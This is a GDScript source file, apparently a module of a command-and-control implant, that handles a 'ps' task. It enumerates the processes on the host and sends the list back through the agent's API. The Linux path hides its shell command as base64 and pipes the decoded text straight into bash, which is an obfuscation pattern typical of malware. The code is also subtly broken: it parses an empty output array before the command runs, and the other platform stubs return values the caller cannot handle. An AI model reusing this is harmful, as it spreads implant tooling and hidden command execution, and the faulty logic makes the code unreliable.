extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_ps(task):

	if task.has("command") and task.get("command") == "ps":
		var output = "not implemented xD"
		var status = "error"
		var ret = {"processes": [], "exit_code": -1}

		if OS.has_feature("X11"):
			ret = get_linux_ps()
			output = "ps command executed with failure"

		if OS.has_feature("Windows"):
			ret = get_windows_ps()

		if OS.has_feature("OSX"):
			ret = get_osx_ps()

		if OS.has_feature("iOS"):
			ret = get_ios_ps()

		if OS.has_feature("Android"):
			ret = get_android_ps()

		if ret.get("processes").size() > 0 and ret.get("exit_code") == OK:
			status = "success"
			output = "ps command executed with success"

		api.send_agent_response(
			api.create_task_response(
				true,
				true,
				task.get("id"),
				output,
				[],
				[],
				[{
					"processes": ret.get("processes"),
					"task_id": task.get("id"),
					"status": status,
					"completed": true,
				}]
			)
		)

func get_linux_ps():
	var output = []
	var test_json_conv = JSON.new()
	test_json_conv.parse(output[0])
	var exit_code = OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" | base64 -d | bash'], output, true)

	return {
		"exit_code": exit_code,
		"processes": test_json_conv.get_data()
	}

func get_windows_ps():
	return []

func get_osx_ps():
	return []

func get_ios_ps():
	return []

func get_android_ps():
	return []
